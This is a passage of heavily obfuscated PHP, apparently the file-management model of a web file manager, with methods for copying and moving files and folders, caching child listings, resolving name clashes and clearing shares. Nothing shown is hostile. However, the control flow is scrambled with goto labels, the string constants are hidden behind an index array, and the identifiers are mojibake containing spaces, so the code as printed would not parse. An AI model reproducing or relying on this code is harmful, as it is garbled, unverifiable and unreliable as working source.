…ÌÇ¹­[87]; goto DËíàšÓì; EËÎ‘æîİ: } private function _copyCreate($aê¦Èµ²¡, $déµÔÔÍ¶», $Eô ïàƒ°º, &$EÅÚ·ùŞÃ¨) { goto eŞÂ‡„Şáå; fÍ¬¿İ›‘Ü: $this->chunkEventSet($b ŒĞõÔ[543], array($b ŒĞõÔ[544], $B¯ˆ„Ûáì, $b£‹™¤«¾Ü)); $this->saveAll($eñğİÈõÏ©); return $Aë™­¾³¬¨; goto D¬è‡ŸÔä; D·ÄŞé÷ƒ¸: if ($A›ŠŠ¦ÏªØ[$b ŒĞõÔ[403]] != $b ŒĞõÔ[87]) { $EÅÚ·ùŞÃ¨[$b ŒĞõÔ[529]][] = $A›ŠŠ¦ÏªØ[$b ŒĞõÔ[447]]; return $Aë™­¾³¬¨; } $E™íØ¦Âçù = array(); $B‡ï÷ÉèË = array(); goto b›®ß†®§ø; b›®ß†®§ø: $this->_childrenListAll($aê¦Èµ²¡, $E™íØ¦Âçù); $b£‹™¤«¾Ü = count($E™íØ¦Âçù); if ($b£‹™¤«¾Ü == 0) { return $Aë™­¾³¬¨; } goto c¹Ğ±Õ®—±; AŒ‚²‹Éğ: $this->addAll($B‡ï÷ÉèË, array(), !1); $cß¿‡­î­à = $this->where(array($b ŒĞõÔ[478] => $Aë™­¾³¬¨))->select(); $bÉÁôñÅ³ = $this->_childrenMakeRelation($E™íØ¦Âçù, $cß¿‡­î­à); goto AªÕ¾‰Ì¬„; A†¦×ëç: $Aë™­¾³¬¨ = $this->add($B¯ˆ„Ûáì); $F¥÷¤È¨À = array($b ŒĞõÔ[395] => $Aë™­¾³¬¨, $b ŒĞõÔ[28] => $Eô ïàƒ°º); $this->_copyApplyMeta($F¥÷¤È¨À, $EÅÚ·ùŞÃ¨); goto D·ÄŞé÷ƒ¸; c¹Ğ±Õ®—±: $e‰İà˜Ê° = $this->sourceInfo($Aë™­¾³¬¨); foreach ($E™íØ¦Âçù as $DŞæöÇÛÏè) { $AŒËĞª“¹ó = $this->_makeItemData($DŞæöÇÛÏè, $e‰İà˜Ê°, $DŞæöÇÛÏè[$b ŒĞõÔ[28]]); $AŒËĞª“¹ó[$b ŒĞõÔ[487]] = $DŞæöÇÛÏè[$b ŒĞõÔ[487]]; $B‡ï÷ÉèË[] = $AŒËĞª“¹ó; } $this->chunkEventSet($b ŒĞõÔ[539], array($b ŒĞõÔ[540], $B¯ˆ„Ûáì, $b£‹™¤«¾Ü)); goto AŒ‚²‹Éğ; Fô­ÆÊ‚¢‚: foreach ($cß¿‡­î­à as $DŞæöÇÛÏè) { $aÓà„Â‡ŒÇ = $DŞæöÇÛÏè[$b ŒĞõÔ[395]]; $dî‘ª¹¶Î® = $this->_childrenMatch($bÉÁôñÅ³, $DŞæöÇÛÏè, $e‰İà˜Ê°); $dÅÛ«éˆÅØ[] = array($b ŒĞõÔ[395], $aÓà„Â‡ŒÇ, $b ŒĞõÔ[478], $dî‘ª¹¶Î®[$b ŒĞõÔ[478]]); $eñğİÈõÏ©[] = array($b ŒĞõÔ[395], $aÓà„Â‡ŒÇ, $b ŒĞõÔ[487], $dî‘ª¹¶Î®[$b ŒĞõÔ[487]]); $this->_copyApplyMeta($DŞæöÇÛÏè, $EÅÚ·ùŞÃ¨); if ($DŞæöÇÛÏè[$b ŒĞõÔ[403]] != $b ŒĞõÔ[87]) { $EÅÚ·ùŞÃ¨[$b ŒĞõÔ[529]][] = $DŞæöÇÛÏè[$b ŒĞõÔ[447]]; } } $this->chunkEventSet($b ŒĞõÔ[541], array($b ŒĞõÔ[542], $B¯ˆ„Ûáì, $b£‹™¤«¾Ü)); $this->saveAll($dÅÛ«éˆÅØ); goto fÍ¬¿İ›‘Ü; eŞÂ‡„Şáå: $b ŒĞõÔ =& $_SERVER[œº]; $A›ŠŠ¦ÏªØ = $this->sourceInfoCache($aê¦Èµ²¡); $B»Éã»¥ = $this->sourceInfoCache($déµÔÔÍ¶»); goto AÈæª³˜ğ; AÈæª³˜ğ: $B¯ˆ„Ûáì = $this->_makeItemData($A›ŠŠ¦ÏªØ, $B»Éã»¥, $Eô ïàƒ°º); Hook::trigger($b ŒĞõÔ[536], $B¯ˆ„Ûáì); Hook::trigger($b ŒĞõÔ[537], array($b ŒĞõÔ[538], $B¯ˆ„Ûáì, 0)); goto A†¦×ëç; AªÕ¾‰Ì¬„: $bÉÁôñÅ³[$aê¦Èµ²¡] = $Aë™­¾³¬¨; $dÅÛ«éˆÅØ = array(); $eñğİÈõÏ© = array(); goto Fô­ÆÊ‚¢‚; D¬è‡ŸÔä: } private function _childrenMakeRelation($D¥Ä¼ø©Æ¥, $E†±‘šÙÉ£) { $Cò°¶È®Øº =& $_SERVER[œº]; $D¸öÈØíİ = array(); $D·ªï‚—²  = array(); foreach ($D¥Ä¼ø©Æ¥ as $D¼å’à…Ÿ) { $Eçù¶÷“ÅÁ = $D¼å’à…Ÿ[$Cò°¶È®Øº[28]] . $Cò°¶È®Øº[8] . $D¼å’à…Ÿ[$Cò°¶È®Øº[487]]; $D¸öÈØíİ[$Eçù¶÷“ÅÁ] = $D¼å’à…Ÿ[$Cò°¶È®Øº[395]]; } foreach ($E†±‘šÙÉ£ as $D¼å’à…Ÿ) { $Eçù¶÷“ÅÁ = $D¼å’à…Ÿ[$Cò°¶È®Øº[28]] . $Cò°¶È®Øº[8] . $D¼å’à…Ÿ[$Cò°¶È®Øº[487]]; $D Û»ƒà = $D¸öÈØíİ[$Eçù¶÷“ÅÁ]; $D·ªï‚—² [$D Û»ƒà] = $D¼å’à…Ÿ[$Cò°¶È®Øº[395]]; } return $D·ªï‚—² ; } private function _childrenMatch($AÃ¢ƒ»Ú¬¥, $CğÊà‚Åµƒ, $cŠÀÁÇ÷®œ) { goto F“Íò„Öèñ; F“Íò„Öèñ: $CÂ‘‰“ö =& $_SERVER[œº]; $c‹™›™®Ñ = $cŠÀÁÇ÷®œ[$CÂ‘‰“ö[487]]; $b¾Ù“À³ÍÁ = $this->parentLevelArray($CğÊà‚Åµƒ[$CÂ‘‰“ö[487]]); goto CêØ‚Œ÷è; CêØ‚Œ÷è: foreach ($b¾Ù“À³ÍÁ as $d§ñØ®Ä„) { if (isset($AÃ¢ƒ»Ú¬¥[$d§ñØ®Ä„])) { $c‹™›™®Ñ .= $AÃ¢ƒ»Ú¬¥[$d§ñØ®Ä„] . $CÂ‘‰“ö[545]; } } $c‹™›™®Ñ = rtrim($c‹™›™®Ñ, $CÂ‘‰“ö[47]) . $CÂ‘‰“ö[47]; $e¥øŞ½–ÛË = $this->parentLevelArray($c‹™›™®Ñ); goto AÀå™¶ÊŸ¯; AÀå™¶ÊŸ¯: $b°É‰ï¹Ÿì = $e¥øŞ½–ÛË[count($e¥øŞ½–ÛË) - 1]; return array($CÂ‘‰“ö[478] => $b°É‰ï¹Ÿì, $CÂ‘‰“ö[487] => $c‹™›™®Ñ); goto B¬—­½Ë˜÷; B¬—­½Ë˜÷: } private function _makeItemData($Bàù¨†óÅ, $DÂÖÖ“ñµ…, $eÚºç‡‰Œ) { $F»òØÇíå‘ =& $_SERVER[œº]; $F«ŒİÚˆëñ = array($F»òØÇíå‘[546] => $Bàù¨†óÅ[$F»òØÇíå‘[403]], $F»òØÇíå‘[413] => $eÚºç‡‰Œ, $F»òØÇíå‘[547] => $Bàù¨†óÅ[$F»òØÇíå‘[405]], $F»òØÇíå‘[448] => $Bàù¨†óÅ[$F»òØÇíå‘[447]], $F»òØÇíå‘[548] => $Bàù¨†óÅ[$F»òØÇíå‘[78]], $F»òØÇíå‘[549] => $DÂÖÖ“ñµ…[$F»òØÇíå‘[404]], $F»òØÇíå‘[550] => $DÂÖÖ“ñµ…[$F»òØÇíå‘[484]], $F»òØÇíå‘[551] => USER_ID, $F»òØÇíå‘[552] => USER_ID, $F»òØÇíå‘[394] => $DÂÖÖ“ñµ…[$F»òØÇíå‘[395]], $F»òØÇíå‘[553] => $DÂÖÖ“ñµ…[$F»òØÇíå‘[487]] . $DÂÖÖ“ñµ…[$F»òØÇíå‘[395]] . $F»òØÇíå‘[47], $F»òØÇíå‘[417] => $Bàù¨†óÅ[$F»òØÇíå‘[84]], $F»òØÇíå‘[422] => 0, $F»òØÇíå‘[554] => $F»òØÇíå‘[33]); return $F«ŒİÚˆëñ; } private function _copyApplyMeta($Aà¸¯å«´’, &$E¯ŞÂó“ìÎ) { $Aô„ÊïÌ— =& $_SERVER[œº]; $dºß™Ö‘©À = $Aà¸¯å«´’[$Aô„ÊïÌ—[395]]; $aÀĞˆõ®†Ğ = $Aà¸¯å«´’[$Aô„ÊïÌ—[28]]; if (!isset($Aà¸¯å«´’[$Aô„ÊïÌ—[555]]) || !$Aà¸¯å«´’[$Aô„ÊïÌ—[555]] || $Aà¸¯å«´’[$Aô„ÊïÌ—[555]] == $Aô„ÊïÌ—[191]) { $E¯ŞÂó“ìÎ[$Aô„ÊïÌ—[531]][] = array($Aô„ÊïÌ—[395], $dºß™Ö‘©À, $Aô„ÊïÌ—[555], short_id($dºß™Ö‘©À)); } if (Input::check($aÀĞˆõ®†Ğ, $Aô„ÊïÌ—[556])) { $E¯ŞÂó“ìÎ[$Aô„ÊïÌ—[530]][] = array($Aô„ÊïÌ—[395] => $dºß™Ö‘©À, $Aô„ÊïÌ—[93] => $Aô„ÊïÌ—[444], $Aô„ÊïÌ—[372] => str_replace($Aô„ÊïÌ—[50], $Aô„ÊïÌ—[33], Pinyin::encode($aÀĞˆõ®†Ğ))); $E¯ŞÂó“ìÎ[$Aô„ÊïÌ—[530]][] = array($Aô„ÊïÌ—[395] => $dºß™Ö‘©À, $Aô„ÊïÌ—[93] => $Aô„ÊïÌ—[443], $Aô„ÊïÌ—[372] => Pinyin::encode($aÀĞˆõ®†Ğ, $Aô„ÊïÌ—[557])); } } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($Dçø¥ª‚) { goto BĞô•®è†ö; Dñêî¢‹ğç: $CÄË¡÷·‚ = array_to_keyvalue($CÄË¡÷·‚, $c¶„Œã¼ÍŸ[395]); foreach ($CÄË¡÷·‚ as $f•Ãõ‰ÃŒ‚) { $aàóŸğÅÆ¡ = $f•Ãõ‰ÃŒ‚[$c¶„Œã¼ÍŸ[478]]; $Dçø¥ª‚ = $f•Ãõ‰ÃŒ‚[$c¶„Œã¼ÍŸ[395]]; if (!isset($this->_childrenListCache[$Dçø¥ª‚]) && $f•Ãõ‰ÃŒ‚[$c¶„Œã¼ÍŸ[403]] == $c¶„Œã¼ÍŸ[87]) { $this->_childrenListCache[$Dçø¥ª‚] = array(); } if (!isset($this->_childrenListCache[$aàóŸğÅÆ¡])) { $this->_childrenListCache[$aàóŸğÅÆ¡] = array(); } $this->_childrenListCache[$aàóŸğÅÆ¡][$Dçø¥ª‚] = $f•Ãõ‰ÃŒ‚; $this->_childrenItemCache[$Dçø¥ª‚] = $f•Ãõ‰ÃŒ‚; } goto AºÃä‰Š; c×ÑğØƒ¡Â: $AÂ™íÌ²‰ = array($c¶„Œã¼ÍŸ[487] => array($c¶„Œã¼ÍŸ[512], $cŸÖğ˜…[$c¶„Œã¼ÍŸ[487]] . $Dçø¥ª‚ . $c¶„Œã¼ÍŸ[513]), $c¶„Œã¼ÍŸ[423] => $this->targetIsDelete); $CÄË¡÷·‚ = $this->field($e‚“™ŠÕ)->where($AÂ™íÌ²‰)->select(); if (!$CÄË¡÷·‚) { return; } goto Dñêî¢‹ğç; BĞô•®è†ö: $c¶„Œã¼ÍŸ =& $_SERVER[œº]; $cŸÖğ˜… = $this->sourceInfo($Dçø¥ª‚); $e‚“™ŠÕ = $c¶„Œã¼ÍŸ[424]; goto c×ÑğØƒ¡Â; AºÃä‰Š: } private function _childrenListAll($DªÈÕŞ ·³, &$d‡¶µàÉö) { $dù±Ú“¦ğÒ =& $_SERVER[œº]; if (!isset($this->_childrenListCache[$DªÈÕŞ ·³])) { return; } $e­»•Ûèçš = $this->_childrenListCache[$DªÈÕŞ ·³]; foreach ($e­»•Ûèçš as $DÀàÑÒŸàï => $AŒƒÀ®ÇÏ) { $d‡¶µàÉö[$DÀàÑÒŸàï] = $AŒƒÀ®ÇÏ; if ($AŒƒÀ®ÇÏ[$dù±Ú“¦ğÒ[403]] == $dù±Ú“¦ğÒ[87]) { $this->_childrenListAll($DÀàÑÒŸàï, $d‡¶µàÉö); } } } private function sourceInfoCache($FğíØñÚƒ¨) { if (isset($this->_childrenItemCache[$FğíØñÚƒ¨])) { return $this->_childrenItemCache[$FğíØñÚƒ¨]; } return $this->sourceInfo($FğíØñÚƒ¨); } private function _childrenList($a¥Ë—›à†) { if (isset($this->_childrenListCache[$a¥Ë—›à†])) { return $this->_childrenListCache[$a¥Ë—›à†]; } return $this->_childrenListSelect($a¥Ë—›à†); } private function _childrenListSelect($BáÎ“š–ä¸) { goto f¥±ÓÊ¡‹; D¹äÈ¡ÁÅ: $Bô¾áÍö„’ = $Bô¾áÍö„’ ? $Bô¾áÍö„’ : array(); $aœ¹Éİ¤Š = array_to_keyvalue($Bô¾áÍö„’, $CÂŸÌâ‹¶ò[395]); $this->_childrenListCache[$BáÎ“š–ä¸] = $aœ¹Éİ¤Š; goto a¿—áÜñ; f¥±ÓÊ¡‹: $CÂŸÌâ‹¶ò =& $_SERVER[œº]; $FŒÕãŠàÑÕ = array($CÂŸÌâ‹¶ò[478] => $BáÎ“š–ä¸, $CÂŸÌâ‹¶ò[423] => $this->targetIsDelete); $Bô¾áÍö„’ = $this->where($FŒÕãŠàÑÕ)->select(); goto D¹äÈ¡ÁÅ; a¿—áÜñ: foreach ($aœ¹Éİ¤Š as $BáÎ“š–ä¸ => $d„òî¡ç¢³) { $this->_childrenItemCache[$BáÎ“š–ä¸] = $d„òî¡ç¢³; } return $aœ¹Éİ¤Š; goto aÑóø†°¿Ÿ; aÑóø†°¿Ÿ: } private function fileNameExistCache($d¤Ü×ÈÑ¬¼, $C½¡ŠàÀÂ‘) { $c¯ôµ²ÛÍ¢ =& $_SERVER[œº]; $C½¡ŠàÀÂ‘ = strtolower($C½¡ŠàÀÂ‘); $A†î­Í¼ = $this->_childrenList($d¤Ü×ÈÑ¬¼); foreach ($A†î­Í¼ as $E‰Ø§³Ç©) { if ($C½¡ŠàÀÂ‘ == strtolower($E‰Ø§³Ç©[$c¯ôµ²ÛÍ¢[28]])) { return $E‰Ø§³Ç©[$c¯ôµ²ÛÍ¢[395]]; } } return !1; } private function fileNameAutoCache($aäæØ‰Ş¶·, $c¯¤†±ÂŞ, $F¢ƒçß„ª, $CšîĞ³‡Õ­) { $fö‚‡±Üæº =& $_SERVER[œº]; $DŞ‹÷Ø±•½ = $this->_childrenList($aäæØ‰Ş¶·); $A²×‚Œ’Ê’ = array_to_keyvalue($DŞ‹÷Ø±•½, $fö‚‡±Üæº[33], $fö‚‡±Üæº[28]); return $this->fileNameAutoGet($A²×‚Œ’Ê’, $c¯¤†±ÂŞ, $F¢ƒçß„ª, $CšîĞ³‡Õ­); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($A‘ÕÓæ­¥, $C¡ˆ†ÙŞñË, $cä‡“¿’‡Ò = REPEAT_REPLACE, $b¢¦Õ—ê£æ = '') { goto c²Ü«˜„¤ß; Fœ»ï…Æ¯¶: $this->updateModifyTime($BŒ¬•®Åé); Model($f–äÒ”ì¸[533])->eventMove($A‘ÕÓæ­¥, $bÒ©Ó¤±Ÿ™[$f–äÒ”ì¸[478]], $C¡ˆ†ÙŞñË); Hook::trigger($f–äÒ”ì¸[559], $C¶óÈÏäÜ¡); goto aŞ’Úå¢‘Ç; B—–ó¥µê: $this->lockWriteStart($C¡ˆ†ÙŞñË, $EÛÖ£ôáß˜); $fáÆç‘Ù¼¹ = array($f–äÒ”ì¸[529] => array(), $f–äÒ”ì¸[560] => !1); $this->clearShare($A‘ÕÓæ­¥, $C¡ˆ†ÙŞñË); goto cñ›çá¹ï«; cñ›çá¹ï«: $bÃ…‡™Ğ = $this->fileNameExistCache($C¡ˆ†ÙŞñË, $bÒ©Ó¤±Ÿ™[$f–äÒ”ì¸[28]]); $EÉµßÂñŸ = $this->_move($A‘ÕÓæ­¥, $C¡ˆ†ÙŞñË, $cä‡“¿’‡Ò, $fáÆç‘Ù¼¹, $b¢¦Õ—ê£æ); $this->sourceCacheClear(); goto bêå½îöÖ; aŞ’Úå¢‘Ç: return $EÉµßÂñŸ; goto d”­Šâ’æá; BŒµŠ¼ÚÅ†: if ($bÒ©Ó¤±Ÿ™[$f–äÒ”ì¸[478]] == $B¥“ÙĞíª˜[$f–äÒ”ì¸[395]]) { if ($bÒ©Ó¤±Ÿ™[$f–äÒ”ì¸[423]] == $f–äÒ”ì¸[87]) { Model($f–äÒ”ì¸[421])->restore(array($A‘ÕÓæ­¥)); } if (!$b¢¦Õ—ê£æ || $b¢¦Õ—ê£æ == $bÒ©Ó¤±Ÿ™[$f–äÒ”ì¸[28]]) { return $A‘ÕÓæ­¥; } } $C¶óÈÏäÜ¡ = $this->pathInfoMore($A‘ÕÓæ­¥); if ($this->isParentOf($A‘ÕÓæ­¥, $C¡ˆ†ÙŞñË)) { return !1; } goto A÷Çğ¨…«é; A÷Çğ¨…«é: if (!$bÒ©Ó¤±Ÿ™ || !$B¥“ÙĞíª˜ || $B¥“ÙĞíª˜[$f–äÒ”ì¸[403]] != $f–äÒ”ì¸[87]) { return !1; } Hook::trigger($f–äÒ”ì¸[558], $C¶óÈÏäÜ¡); $this->targetIsDelete = intval($bÒ©Ó¤±Ÿ™[$f–äÒ”ì¸[423]]); goto aÒ†ÓÓÂø—; c²Ü«˜„¤ß: $f–äÒ”ì¸ =& $_SERVER[œº]; $bÒ©Ó¤±Ÿ™ = $this->sourceInfo($A‘ÕÓæ­¥); $B¥“ÙĞíª˜ = $this->sourceInfo($C¡ˆ†ÙŞñË); goto BŒµŠ¼ÚÅ†; E÷ò“™‰Õà: $this->lockMoveEnd($A‘ÕÓæ­¥); $this->lockWriteEnd($C¡ˆ†ÙŞñË, $EÛÖ£ôáß˜); $this->folderSizeReset($bÒ©Ó¤±Ÿ™[$f–äÒ”ì¸[478]]); goto bµÆî”¸³ğ; bêå½îöÖ: if ($bÒ©Ó¤±Ÿ™[$f–äÒ”ì¸[403]] == $f–äÒ”ì¸[87] && $bÃ…‡™Ğ) { $this->folderSizeResetChildren($EÉµßÂñŸ); } Model($f–äÒ”ì¸[193])->linkAdd($fáÆç‘Ù¼¹[$f–äÒ”ì¸[529]]); if ($bÃ…‡™Ğ && $fáÆç‘Ù¼¹[$f–äÒ”ì¸[560]]) { $this->removeNow($A‘ÕÓæ­¥, !1); } goto E÷ò“™‰Õà; bµÆî”¸³ğ: $this->folderSizeReset($C¡ˆ†ÙŞñË); $BŒ¬•®Åé = array($bÒ©Ó¤±Ÿ™[$f–äÒ”ì¸[478]], $C¡ˆ†ÙŞñË); if ($bÒ©Ó¤±Ÿ™[$f–äÒ”ì¸[403]] == $f–äÒ”ì¸[87]) { $BŒ¬•®Åé[] = $A‘ÕÓæ­¥; } goto Fœ»ï…Æ¯¶; aÒ†ÓÓÂø—: if ($bÒ©Ó¤±Ÿ™[$f–äÒ”ì¸[478]] == $C¡ˆ†ÙŞñË && $b¢¦Õ—ê£æ != $bÒ©Ó¤±Ÿ™[$f–äÒ”ì¸[28]]) { $Bì¢Æç° = $this->fileNameExist($C¡ˆ†ÙŞñË, $b¢¦Õ—ê£æ); if ($Bì¢Æç° && $bÒ©Ó¤±Ÿ™[$f–äÒ”ì¸[403]] == $f–äÒ”ì¸[191]) { goto DË‚ù²öÇ“; bóÕ©“ÊŠ: return $Bì¢Æç°; goto FºÕœ¿Æ—»; DË‚ù²öÇ“: $A¿°‡ŞŸ†í = $this->sourceInfo($Bì¢Æç°); $F¨À©·‘Ä¢ = $this->fileHistory($A¿°‡ŞŸ†í, $bÒ©Ó¤±Ÿ™[$f–äÒ”ì¸[447]], $bÒ©Ó¤±Ÿ™[$f–äÒ”ì¸[78]]); if (!$F¨À©·‘Ä¢) { Model($f–äÒ”ì¸[450])->remove($bÒ©Ó¤±Ÿ™[$f–äÒ”ì¸[447]]); } goto E·²šÃï¨Ğ; E·²šÃï¨Ğ: $this->removeNow($A‘ÕÓæ­¥, !1); $this->folderSizeReset($C¡ˆ†ÙŞñË); Hook::trigger($f–äÒ”ì¸[559], $C¶óÈÏäÜ¡); goto bóÕ©“ÊŠ; FºÕœ¿Æ—»: } } $EÛÖ£ôáß˜ = $b¢¦Õ—ê£æ ? $b¢¦Õ—ê£æ : $bÒ©Ó¤±Ÿ™[$f–äÒ”ì¸[28]]; $this->lockMoveStart($A‘ÕÓæ­¥); goto B—–ó¥µê; d”­Šâ’æá: } private function _move($E¨ùÔÅ‡²¶, $bºø………»­, $DÊê¢Ö†ÀŒ, &$CÆ½â²¨ñä, $DÉª”‘Ïë = '') { goto AáèİÆÀ“¸; B¿ˆù½ö•ê: $this->lockWriteStart($bºø………»­, $c‘ÓÜ‡¼µ); if (!$e‹ğàÜ†) { return $this->_moveForce($E¨ùÔÅ‡²¶, $bºø………»­, $c‘ÓÜ‡¼µ); } $d¾ÆÎñ¾È³ = $e‹ğàÜ†; goto BŞ‹ëÎ¦Ç; BŞ‹ëÎ¦Ç: $Bœ‹Ô‡Ç´í = !1; if ($f‡¬ÒÖ‘¦ğ) { if ($DÊê¢Ö†ÀŒ == REPEAT_RENAME_FOLDER) { $c‘ÓÜ‡¼µ = $this->fileNameAuto($bºø………»­, $c‘ÓÜ‡¼µ, $DÊê¢Ö†ÀŒ, $f‡¬ÒÖ‘¦ğ); $d¾ÆÎñ¾È³ = $this->_moveForce($E¨ùÔÅ‡²¶, $bºø………»­, $c‘ÓÜ‡¼µ); } else { if ($DÊê¢Ö†ÀŒ == REPEAT_RENAME_FOLDER) { $DÊê¢Ö†ÀŒ = REPEAT_RENAME; } $FÊ–¥Â™¸‘ = $this->_childrenListSelect($E¨ùÔÅ‡²¶); foreach ($FÊ–¥Â™¸‘ as $B±êç²•¤) { $this->_move($B±êç²•¤[$A¡›ïèêæ[395]], $e‹ğàÜ†, $DÊê¢Ö†ÀŒ, $CÆ½â²¨ñä); } $Bœ‹Ô‡Ç´í = !0; } } else { if ($DÊê¢Ö†ÀŒ == REPEAT_SKIP) { $Bœ‹Ô‡Ç´í = !0; } else { if ($DÊê¢Ö†ÀŒ == REPEAT_RENAME || $DÊê¢Ö†ÀŒ == REPEAT_RENAME_FOLDER) { $c‘ÓÜ‡¼µ = $this->fileNameAuto($bºø………»­, $c‘ÓÜ‡¼µ, $DÊê¢Ö†ÀŒ, $f‡¬ÒÖ‘¦ğ); $d¾ÆÎñ¾È³ = $this->_moveForce($E¨ùÔÅ‡²¶, $bºø………»­, $c‘ÓÜ‡¼µ); } else { if ($DÊê¢Ö†ÀŒ == REPEAT_REPLACE) { $eòñ¾ì’¼ = $this->sourceInfoCache($e‹ğàÜ†); $A¯‡¶Œ¢Ê = $this->fileHistory($eòñ¾ì’¼, $e´¬ƒÄŒÇß[$A¡›ïèêæ[447]], $e´¬ƒÄŒÇß[$A¡›ïèêæ[78]]); if ($A¯‡¶Œ¢Ê) { $CÆ½â²¨ñä[$A¡›ïèêæ[529]][] = $e´¬ƒÄŒÇß[$A¡›ïèêæ[447]]; } else { $Bœ‹Ô‡Ç´í = !0; } } } } } if ($Bœ‹Ô‡Ç´í && !$CÆ½â²¨ñä[$A¡›ïèêæ[560]]) { $CÆ½â²¨ñä[$A¡›ïèêæ[560]] = !0; } goto d¹áøİĞæé; AáèİÆÀ“¸: $A¡›ïèêæ =& $_SERVER[œº]; $e´¬ƒÄŒÇß = $this->sourceInfo($E¨ùÔÅ‡²¶); $f‡¬ÒÖ‘¦ğ = $e´¬ƒÄŒÇß[$A¡›ïèêæ[403]] == $A¡›ïèêæ[87]; goto A¤ÌÔ…·Ô”; A¤ÌÔ…·Ô”: $c‘ÓÜ‡¼µ = $DÉª”‘Ïë ? $DÉª”‘Ïë : $e´¬ƒÄŒÇß[$A¡›ïèêæ[28]]; $e‹ğàÜ† = $this->fileNameExistCache($bºø………»­, $c‘ÓÜ‡¼µ); $this->lockMoveStart($E¨ùÔÅ‡²¶); goto B¿ˆù½ö•ê; d¹áøİĞæé: return $d¾ÆÎñ¾È³; goto fÙÇ’“š£Œ; fÙÇ’“š£Œ: } private function _moveForce($Dã‹šêÀ‘, $F³„ï™ ¡·, $DÒ×”½øªé) { goto EÅ‡®ùÙÌÀ; fÅ™ÄÙä‹: if (!$eÏˆ‰»ÙØ && $this->moveClearAuth) { Model($AŠŒÅŒ‹ç¢[482])->authClear($Dã‹šêÀ‘); } $CïŠŞ‡ëÌ = $FÒÊ§ƒà•[$AŠŒÅŒ‹ç¢[423]] == $AŠŒÅŒ‹ç¢[87] && $fÒªÈè¢ß¾[$AŠŒÅŒ‹ç¢[423]] != $AŠŒÅŒ‹ç¢[87]; if ($CïŠŞ‡ëÌ) { $F®™‰ƒÓÌÑ[$AŠŒÅŒ‹ç¢[422]] = 0; } goto FÌ©ŸéŞ’¯; FÌ©ŸéŞ’¯: if ($Eºİ•²) { $f‹Æ²ìŞ®Å = array($AŠŒÅŒ‹ç¢[553] => array($AŠŒÅŒ‹ç¢[512], $FÒÊ§ƒà•[$AŠŒÅŒ‹ç¢[487]] . $FÒÊ§ƒà•[$AŠŒÅŒ‹ç¢[395]] . $AŠŒÅŒ‹ç¢[513])); $bºé´‹í©™ = $FÒÊ§ƒà•[$AŠŒÅŒ‹ç¢[487]] . $FÒÊ§ƒà•[$AŠŒÅŒ‹ç¢[395]] . $AŠŒÅŒ‹ç¢[47]; $D¥ò„÷¦ô˜ = $fÒªÈè¢ß¾[$AŠŒÅŒ‹ç¢[487]] . $fÒªÈè¢ß¾[$AŠŒÅŒ‹ç¢[395]] . $AŠŒÅŒ‹ç¢[47] . $FÒÊ§ƒà•[$AŠŒÅŒ‹ç¢[395]] . $AŠŒÅŒ‹ç¢[47]; $DÔêØ®ÏÀË = array($AŠŒÅŒ‹ç¢[553] => array($AŠŒÅŒ‹ç¢[561], "\x72\x65\160\x6c\141\143\x65\x28\x70\141\x72\145\x6e\164\x4c\x65\166\145\154\54\x27{$bºé´‹í©™}\x27\x2c\47{$D¥ò„÷¦ô˜}\x27\x29"), $AŠŒÅŒ‹ç¢[549] => $fÒªÈè¢ß¾[$AŠŒÅŒ‹ç¢[404]], $AŠŒÅŒ‹ç¢[550] => $fÒªÈè¢ß¾[$AŠŒÅŒ‹ç¢[484]]); if ($CïŠŞ‡ëÌ) { $DÔêØ®ÏÀË[$AŠŒÅŒ‹ç¢[422]] = 0; } $this->where($f‹Æ²ìŞ®Å)->data($DÔêØ®ÏÀË)->save(); } $this->where(array($AŠŒÅŒ‹ç¢[410] => $Dã‹šêÀ‘))->data($F®™‰ƒÓÌÑ)->save(); return $Dã‹šêÀ‘; goto BÑÑ„”î; Fç¦¢ËÃºë: $Eºİ•² = $FÒÊ§ƒà•[$AŠŒÅŒ‹ç¢[403]] == $AŠŒÅŒ‹ç¢[87]; $F®™‰ƒÓÌÑ = array($AŠŒÅŒ‹ç¢[394] => $fÒªÈè¢ß¾[$AŠŒÅŒ‹ç¢[395]], $AŠŒÅŒ‹ç¢[553] => $fÒªÈè¢ß¾[$AŠŒÅŒ‹ç¢[487]] . $fÒªÈè¢ß¾[$AŠŒÅŒ‹ç¢[395]] . $AŠŒÅŒ‹ç¢[47], $AŠŒÅŒ‹ç¢[549] => $fÒªÈè¢ß¾[$AŠŒÅŒ‹ç¢[404]], $AŠŒÅŒ‹ç¢[550] => $fÒªÈè¢ß¾[$AŠŒÅŒ‹ç¢[484]], $AŠŒÅŒ‹ç¢[552] => USER_ID, $AŠŒÅŒ‹ç¢[413] => $DÒ×”½øªé); $eÏˆ‰»ÙØ = $FÒÊ§ƒà•[$AŠŒÅŒ‹ç¢[404]] == SourceModel::TYPE_GROUP && $fÒªÈè¢ß¾[$AŠŒÅŒ‹ç¢[404]] == SourceModel::TYPE_GROUP && $FÒÊ§ƒà•[$AŠŒÅŒ‹ç¢[484]] == $fÒªÈè¢ß¾[$AŠŒÅŒ‹ç¢[484]]; goto fÅ™ÄÙä‹; EÅ‡®ùÙÌÀ: $AŠŒÅŒ‹ç¢ =& $_SERVER[œº]; $FÒÊ§ƒà• = $this->sourceInfo($Dã‹šêÀ‘); $fÒªÈè¢ß¾ = $this->sourceInfo($F³„ï™ ¡·); goto Fç¦¢ËÃºë; BÑÑ„”î: } private function clearShare($cìÒ…Û²ŞÙ, $E‡ŒĞŸä»Â) { goto cˆÓÓè‹‘; C×¥Äñë°æ: if (!$bÁ‹ëÑªíÍ) { return; } $e¡‘ò´âŠ = array($Dİê¶°¸§[395] => array($Dİê¶°¸§[7], $bÁ‹ëÑªíÍ), $Dİê¶°¸§[475] => 1); $B–öß™µË­ = Model($Dİê¶°¸§[563])->field($Dİê¶°¸§[468])->where($e¡‘ò´âŠ)->select(); goto FÖ†¯ƒÜÕã; FÁï²¾‘É¶: Model($Dİê¶°¸§[563])->where($e¡‘ò´âŠ)->save(array($Dİê¶°¸§[475] => 0)); Model($Dİê¶°¸§[564])->where($e¡‘ò´âŠ)->delete(); goto DÚ¥ŸÍ¨­; cˆÓÓè‹‘: $Dİê¶°¸§ =& $_SERVER[œº]; $b¢“‰µ¥Œƒ = $this->sourceInfo($cìÒ…Û²ŞÙ); $C‘ö­µèîÜ = $this->sourceInfo($E‡ŒĞŸä»Â); goto fÔĞÍ¦¥Ù‹; fÔĞÍ¦¥Ù‹: if ($b¢“‰µ¥Œƒ[$Dİê¶°¸§[484]] == 